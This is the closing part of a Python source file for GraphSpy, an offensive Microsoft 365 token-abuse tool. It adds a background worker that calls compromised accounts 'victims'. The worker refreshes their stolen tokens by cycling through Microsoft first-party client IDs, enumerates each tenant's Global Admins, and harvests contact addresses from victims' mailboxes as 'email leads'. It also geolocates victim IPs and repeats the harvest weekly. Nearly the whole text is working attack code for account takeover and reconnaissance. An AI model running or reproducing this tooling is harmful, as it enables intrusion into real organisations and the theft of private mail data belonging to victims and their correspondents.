 \______  /__|  |____  |   __/|___|  /_______  /   ___/ ____|
        \/           \/|__|        \/        \/|__|   \/
                """)
    # Argument Parser
    import argparse
    parser = argparse.ArgumentParser(prog="graphspy", description="Launches the GraphSpy Flask application", epilog="For more information, see https://github.com/RedByte1337/GraphSpy")
    parser.add_argument("-i","--interface", type=str, help="The interface to bind to. Use 0.0.0.0 for all interfaces. (Default = 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, help="The port to bind to. (Default = 5000)")
    parser.add_argument("-d","--database", type=str, default="database.db", help="Database file to utilize. (Default = database.db)")
    parser.add_argument("--debug", action="store_true", help="Enable flask debug mode. Will show detailed stack traces when an error occurs.")
    args = parser.parse_args()

    # Configure logging
    global gspy_log
    gspy_log = logging.getLogger(__name__)
    gspy_log.setLevel(logging.DEBUG if args.debug else logging.ERROR)
    log_handler = logging.StreamHandler()
    log_format = "[%(funcName)s():%(lineno)s] %(levelname)s: %(message)s"
    log_handler.setFormatter(logging.Formatter(log_format))
    gspy_log.addHandler(log_handler)

    # Create global Flask app variable
    global app
    app = Flask(__name__)
    init_routes()

    # First time Use
    graph_spy_folder = os.path.normpath(os.path.expanduser("~/.gspy/"))
    if(not os.path.exists(graph_spy_folder)):
        print("[*] First time use detected.")
        print(f"[*] Creating directory '{graph_spy_folder}'.")
        os.mkdir(graph_spy_folder)
        if(not os.path.exists(graph_spy_folder)):
            sys.exit(f"Failed creating directory '{graph_spy_folder}'. Unable to proceed.")
    app.config['graph_spy_folder'] = graph_spy_folder

    # Database
    database = args.database
    # Normalize db path
    database = database if database.endswith(".db") else f"{database}.db"
    # Create database folder if it doesn't exist yet
    graph_spy_db_folder = os.path.normpath(os.path.join(graph_spy_folder,"databases/"))
    if(not os.path.exists(graph_spy_db_folder)):
        print(f"[*] Creating directory '{graph_spy_db_folder}'.")
        os.mkdir(graph_spy_db_folder)
        if(not os.path.exists(graph_spy_db_folder)):
            sys.exit(f"Failed creating directory '{graph_spy_db_folder}'. Unable to proceed.")
    app.config['graph_spy_db_folder'] = graph_spy_db_folder
    graph_spy_db_path = safe_join(graph_spy_db_folder,database)
    if not graph_spy_db_path:
        sys.exit(f"Invalid database name '{database}'.")
    app.config['graph_spy_db_path'] = graph_spy_db_path
    # Initialize DB if it doesn't exist yet
    if(not os.path.exists(graph_spy_db_path)):
        print(f"[*] Database file '{graph_spy_db_path}' not found. Initializing new database.")
        init_db()
    if(not os.path.exists(graph_spy_db_path)):
        sys.exit(f"Failed creating database file at '{graph_spy_db_path}'. Unable to proceed.")
    print(f"[*] Utilizing database '{graph_spy_db_path}'.")
    # Update the database to the latest schema version if required
    with app.app_context():
        update_db()
    # Disable datatable error messages by default.
    app.config['table_error_messages'] = "disabled"

    # ========== Background Enrichment Thread ==========
    def bg_enrichment_worker():
        """Background thread: auto-enrich new victims with global admins + email leads.
        Runs continuously. When victim count increases, enriches the new ones.
        Uses smart wait on rate limits (no max retries — keeps trying until done)."""
        import time as _time
        known_users = set()
        ip_country_cache = {}

        def bg_db():
            """Get a fresh DB connection for background thread (can't use Flask g)."""
            return sqlite3.connect(app.config['graph_spy_db_path'])

        def bg_query(query, args=(), one=False):
            con = bg_db()
            con.row_factory = sqlite3.Row
            cur = con.execute(query, args)
            rv = cur.fetchall()
            cur.close()
            con.close()
            return (rv[0] if rv else None) if one else rv

        def bg_execute(query, args=()):
            con = bg_db()
            con.execute(query, args)
            con.commit()
            con.close()

        def bg_graph_request(uri, access_token_id):
            """Make a Graph API call using a stored access token. Returns parsed JSON or None."""
            try:
                row = bg_query("SELECT accesstoken FROM accesstokens WHERE id = ?", [access_token_id], one=True)
                if not row:
                    return None
                token = row[0]
                headers = {"Authorization": f"Bearer {token}", "User-Agent": "GraphSpy/1.0"}
                resp = requests.get(uri, headers=headers, timeout=30)
                return resp.json() if resp.text else None
            except Exception as e:
                print(f"[ENRICH] Graph request error: {e}", flush=True)
                return None

        def get_best_token(email):
            """Find or create a valid Graph-scoped access token for a user.
            Tries existing tokens first, then refreshes with multiple client_ids until one works."""
            # Try existing non-expired Graph tokens
            rows = bg_query("SELECT id, accesstoken, resource FROM accesstokens WHERE user = ? ORDER BY id DESC", [email])
            for row in rows:
                if "graph.microsoft.com" in (row["resource"] or ""):
                    try:
                        decoded = jwt.decode(row["accesstoken"], options={"verify_signature": False})
                        if decoded.get("exp", 0) > _time.time():
                            return row["id"]
                    except:
                        pass
            # All expired — try to refresh with multiple client_ids for best scopes
            client_ids = [
                "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office — Directory.Read.All + Mail.ReadWrite
                "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
                "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Auth Broker
                "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  # Teams
            ]
            rt_rows = bg_query("SELECT id, client_id FROM refreshtokens WHERE user = ? ORDER BY id DESC", [email])
            for cid in client_ids:
                for rt in rt_rows:
                    try:
                        with app.app_context():
                            result = refresh_to_access_token(rt["id"], cid, "https://graph.microsoft.com")
                        if isinstance(result, (int, str)) and str(result).isdigit():
                            print(f"[ENRICH] Refreshed token for {email} with client {cid[:8]}...", flush=True)
                            return int(result)
                    except:
                        continue
            print(f"[ENRICH] Could not get valid token for {email}", flush=True)
            return None

        def enrich_admins(email, tid):
            """Fetch global admins for a user's domain. Auto-refreshes tokens. Never gives up (except insufficient_permissions)."""
            domain = email.split("@")[1] if "@" in email else ""
            if not domain:
                return
            # Check if already cached — but if cached with error (not insufficient_permissions), delete and re-fetch
            cached = bg_query("SELECT admins_json FROM cached_admins WHERE domain = ?", [domain], one=True)
            if cached:
                try:
                    admins = json.loads(cached[0])
                    has_real = any(not a.get("error") for a in admins)
                    is_perm_denied = any(a.get("error") == "insufficient_permissions" for a in admins)
                    if has_real:
                        return  # Already have real data
                    if is_perm_denied:
                        return  # Permanently no permission
                    # Stale error cache — delete and re-fetch
                    bg_execute("DELETE FROM cached_admins WHERE domain = ?", [domain])
                    print(f"[ENRICH] Cleared stale error cache for {domain}", flush=True)
                except:
                    bg_execute("DELETE FROM cached_admins WHERE domain = ?", [domain])

            print(f"[ENRICH] Fetching Global Admins for {domain}...", flush=True)
            backoff = 5
            while True:
                data = bg_graph_request(
                    f"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName,mail",
                    tid
                )
                if data is None:
                    # No response — refresh token and retry
                    print(f"[ENRICH] No response for {domain}, refreshing token...", flush=True)
                    new_tid = get_best_token(email)
                    if new_tid:
                        tid = new_tid
                    _time.sleep(backoff)
                    backoff = min(backoff * 2, 120)
                    continue
                if "error" in data:
                    code = data["error"].get("code", "")
                    if code == "TooManyRequests":
                        print(f"[ENRICH] Rate limited for {domain}, waiting {backoff}s...", flush=True)
                        _time.sleep(backoff)
                        backoff = min(backoff * 2, 300)
                        continue
                    elif code in ("Authorization_RequestDenied", "ErrorAccessDenied"):
                        print(f"[ENRICH] No permission for {domain} admins — permanent, caching", flush=True)
                        bg_execute("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)",
                                   (domain, json.dumps([{"error": "insufficient_permissions"}]), datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")))
                        return
                    elif code in ("InvalidAuthenticationToken", "ExpiredToken", "Unauthorized"):
                        # Token expired — refresh and retry immediately, never cache this error
                        print(f"[ENRICH] Token expired for {domain}, refreshing...", flush=True)
                        new_tid = get_best_token(email)
                        if new_tid:
                            tid = new_tid
                            backoff = 5  # Reset backoff after fresh token
                            continue
                        # All refresh attempts failed — wait and try again later
                        _time.sleep(30)
                        new_tid = get_best_token(email)
                        if new_tid:
                            tid = new_tid
                            continue
                        print(f"[ENRICH] All tokens exhausted for {email}, will retry next cycle", flush=True)
                        return  # DON'T cache — worker retries next cycle
                    else:
                        print(f"[ENRICH] Error for {domain}: {code}, retrying in {backoff}s...", flush=True)
                        _time.sleep(backoff)
                        backoff = min(backoff * 2, 120)
                        continue
                # Success — cache real admin list
                members = data.get("value", [])
                bg_execute("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)",
                           (domain, json.dumps(members), datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")))
                print(f"[ENRICH] Cached {len(members)} Global Admin(s) for {domain}", flush=True)
                return

        def enrich_emails(email, tid):
            """Extract email addresses from all folders. Only re-enrich after 7 days."""
            # Check last enrichment
            row = bg_query("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [email], one=True)
            if row and row["last"]:
                try:
                    last_dt = datetime.strptime(row["last"], "%Y-%m-%d %H:%M:%S")
                    days_since = (datetime.now() - last_dt).total_seconds() / 86400
                    if days_since < 7:
                        return  # Already enriched within 7 days
                except:
                    pass

            print(f"[ENRICH] Extracting email leads for {email}...", flush=True)
            leads = {}
            backoff = 5
            # Fetch from inbox messages (top 500)
            uri = "https://graph.microsoft.com/v1.0/me/messages?$top=500&$select=from,toRecipients,ccRecipients&$orderby=receivedDateTime desc"
            while uri:
                data = bg_graph_request(uri, tid)
                if data is None:
                    _time.sleep(backoff)
                    backoff = min(backoff * 2, 120)
                    continue
                if "error" in data:
                    code = data["error"].get("code", "")
                    if code == "TooManyRequests":
                        print(f"[ENRICH] Rate limited for {email} emails, waiting {backoff}s...", flush=True)
                        _time.sleep(backoff)
                        backoff = min(backoff * 2, 300)
                        continue
                    elif code in ("InvalidAuthenticationToken", "ExpiredToken", "Unauthorized"):
                        print(f"[ENRICH] Token expired for {email} emails, refreshing...", flush=True)
                        new_tid = get_best_token(email)
                        if new_tid:
                            tid = new_tid
                            backoff = 5
                            continue
                        # Wait and retry
                        _time.sleep(30)
                        new_tid = get_best_token(email)
                        if new_tid:
                            tid = new_tid
                            continue
                        print(f"[ENRICH] All tokens exhausted for {email} emails, retry next cycle", flush=True)
                        return
                    elif code in ("Authorization_RequestDenied", "ErrorAccessDenied"):
                        print(f"[ENRICH] No mail permission for {email} — permanent", flush=True)
                        return
                    else:
                        print(f"[ENRICH] Email leads error for {email}: {code}, retrying...", flush=True)
                        _time.sleep(backoff)
                        backoff = min(backoff * 2, 120)
                        continue
                for msg in data.get("value", []):
                    if msg.get("from", {}).get("emailAddress"):
                        addr = msg["from"]["emailAddress"].get("address", "").lower()
                        name = msg["from"]["emailAddress"].get("name", "")
                        if addr:
                            leads[addr] = {"name": name, "source": "from"}
                    for field in ("toRecipients", "ccRecipients"):
                        for r in msg.get(field, []):
                            if r.get("emailAddress"):
                                addr = r["emailAddress"].get("address", "").lower()
                                name = r["emailAddress"].get("name", "")
                                if addr:
                                    leads[addr] = {"name": name, "source": field}
                uri = data.get("@odata.nextLink")
                if uri:
                    _time.sleep(1)  # Gentle pacing

            # Save leads to DB
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            con = bg_db()
            for addr, info in leads.items():
                try:
                    con.execute("INSERT OR IGNORE INTO email_leads (user_email, lead_email, lead_name, source, first_seen) VALUES (?, ?, ?, ?, ?)",
                                (email, addr, info["name"], info["source"], now))
                except:
                    pass
            con.commit()
            con.close()
            print(f"[ENRICH] Stored {len(leads)} email leads for {email}", flush=True)

        def resolve_ip_country(ip):
            """Resolve IP to country code via free GeoIP API. Cache results."""
            if not ip or ip in ip_country_cache:
                return ip_country_cache.get(ip, "")
            try:
                resp = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=5)
                data = resp.json()
                cc = data.get("countryCode", "")
                ip_country_cache[ip] = cc
                if cc:
                    bg_execute("INSERT OR REPLACE INTO settings (setting, value) VALUES (?, ?)", (f"ip_country_{ip}", cc))
                return cc
            except:
                return ""

        def worker_loop():
            _time.sleep(10)  # Wait for Flask to fully start
            print("[ENRICH] Background enrichment worker started", flush=True)
            # Clear stale error caches (not insufficient_permissions — those are permanent)
            try:
                stale = bg_query("SELECT domain, admins_json FROM cached_admins")
                for row in stale:
                    try:
                        admins = json.loads(row["admins_json"])
                        has_real = any(not a.get("error") for a in admins)
                        is_perm = any(a.get("error") == "insufficient_permissions" for a in admins)
                        if not has_real and not is_perm:
                            bg_execute("DELETE FROM cached_admins WHERE domain = ?", [row["domain"]])
                            print(f"[ENRICH] Cleared stale cache for {row['domain']}", flush=True)
                    except:
                        bg_execute("DELETE FROM cached_admins WHERE domain = ?", [row["domain"]])
            except Exception as e:
                print(f"[ENRICH] Cache cleanup error: {e}", flush=True)
            first_run = True
            while True:
                try:
                    # Get all unique users
                    rows = bg_query("SELECT DISTINCT user FROM accesstokens WHERE user != 'unknown' AND user != ''")
                    current_users = set(row["user"] for row in rows)

                    # On first run, process ALL users (resolve IPs, check missing enrichments)
                    if first_run:
                        new_users = current_users
                        first_run = False
                    else:
                        new_users = current_users - known_users

                    if new_users:
                        print(f"[ENRICH] {len(new_users)} user(s) to process: {', '.join(new_users)}", flush=True)

                    for email in new_users:
                        tid = get_best_token(email)
                        if not tid:
                            print(f"[ENRICH] No valid token for {email}, will retry next cycle", flush=True)
                            continue

                        # Enrich admins
                        try:
                            enrich_admins(email, tid)
                        except Exception as e:
                            print(f"[ENRICH] Admin enrichment error for {email}: {e}", flush=True)

                        _time.sleep(2)  # Pause between tasks

                        # Enrich email leads
                        try:
                            enrich_emails(email, tid)
                        except Exception as e:
                            print(f"[ENRICH] Email leads error for {email}: {e}", flush=True)

                        _time.sleep(2)  # Pause between users

                        # Resolve IP country
                        try:
                            at_rows = bg_query("SELECT accesstoken FROM accesstokens WHERE user = ? ORDER BY id DESC LIMIT 1", [email])
                            if at_rows:
                                decoded = jwt.decode(at_rows[0]["accesstoken"], options={"verify_signature": False})
                                ip = decoded.get("ipaddr", "")
                                if ip:
                                    resolve_ip_country(ip)
                        except:
                            pass

                    known_users.update(new_users)

                    # Also check for users that need weekly re-enrichment of email leads
                    for email in current_users:
                        try:
                            row = bg_query("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [email], one=True)
                            if row and row["last"]:
                                last_dt = datetime.strptime(row["last"], "%Y-%m-%d %H:%M:%S")
                                days_since = (datetime.now() - last_dt).total_seconds() / 86400
                                if days_since >= 7:
                                    tid = get_best_token(email)
                                    if tid:
                                        print(f"[ENRICH] Weekly re-enrichment for {email}", flush=True)
                                        enrich_emails(email, tid)
                        except:
                            pass

                except Exception as e:
                    print(f"[ENRICH] Worker error: {e}", flush=True)

                _time.sleep(30)  # Check every 30 seconds

        enrichment_thread = Thread(target=worker_loop, daemon=True)
        enrichment_thread.start()
        print("[*] Background enrichment worker started.")

    bg_enrichment_worker()

    # Run flask
    print(f"[*] Starting GraphSpy. Open in your browser by going to the url displayed below.\n")
    app.run(debug=args.debug, host=args.interface, port=args.port)
